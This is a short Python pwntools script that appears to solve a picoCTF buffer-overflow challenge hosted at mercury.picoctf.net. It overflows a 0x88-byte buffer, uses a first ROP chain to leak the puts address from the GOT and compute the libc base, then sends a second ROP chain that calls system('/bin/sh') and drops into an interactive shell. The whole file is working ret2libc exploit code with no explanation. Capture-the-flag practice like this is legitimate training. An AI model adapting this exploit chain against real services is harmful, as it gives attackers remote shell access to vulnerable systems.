#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")

context.binary = exe
context.log_level = "debug"

ret = 0x40052e

def conn() -> remote:
    if args.LOCAL:
        r = process([exe.path])
    else:
        r = remote("mercury.picoctf.net", 42072)

    return r


def main():
    r = conn()
    rop1 = ROP(exe)
    rop1.call("puts", [exe.got["puts"]])
    rop1.call("main")
    payload1 = cyclic(0x88) + rop1.chain()
    r.recvuntil("WeLcOmE To mY EcHo sErVeR!\n")
    r.sendline(payload1)
    r.recvline()
    libc_base = u64(r.recv()[0:6] + b"\x00\x00") - libc.sym["puts"]
    log.debug("[LIBC ADDR]:" + hex(libc_base))
    libc.address = libc_base
    rop2 = ROP(exe)
    rop2.call(ret)
    rop2.call(libc.sym["system"], [next(libc.search(b"/bin/sh"))])
    payload2 = cyclic(0x88) + rop2.chain()
    r.sendline(payload2)
    r.interactive()


if __name__ == "__main__":
    main()
